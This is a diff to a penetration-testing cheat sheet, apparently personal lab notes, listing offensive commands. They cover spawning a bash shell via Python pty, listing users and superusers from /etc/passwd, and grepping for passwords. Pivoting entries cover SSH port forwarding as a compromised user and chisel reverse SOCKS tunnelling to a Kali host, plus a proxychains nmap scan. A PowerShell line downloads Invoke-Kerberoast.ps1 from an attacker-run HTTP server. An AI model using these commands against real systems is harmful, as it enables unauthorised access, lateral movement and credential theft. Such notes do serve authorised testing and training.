@@ -1,9 +1,11 @@
 ### Spawn shell via Python
 `python -c 'import pty;pty.spawn("/bin/bash")' `
-​
-### List of users​
+​ 
+### List of users​ Linux 
 `cat /etc/passwd | cut -d: -f1`    
-`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`        # List of super users
+
+#### List of super users Linux 
+`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`        
 ​
 ### grep for a string in a dir of files
 `grep -ls 'pass' ${PWD}/* `
@@ -31,6 +33,18 @@
 ​
 ### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
 `set PATH=%SystemRoot%\system32;%SystemRoot%;` 
+
+### set up ssh port forwarding with compromised user - good if you cannot use chisel 
+`sudo ssh -L 80:192.168.120.209:80 <compromised_user>@192.168.120.209` 
+
+### Setting up chisel w/ socks proxy
+*On the compromised host that you want to pivot through, proxychains socks5 needs configured* 
+`./chisel client 10.10.15.4:8000 R:socks` 
+*On Kali* 
+`chisel server --socks5 -p 8000 -reverse`
+
+### Proxychains nmap example
+`sudo proxychains -q nmap --top-ports=1000 -Pn -sT -v -oA nmap_172.16.1.102 172.16.1.102` 
 
 ### Powershell download from http server 
 `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.143:8000/Invoke-Kerberoast.ps1', 'Invoke-Kerberoast.ps1')`
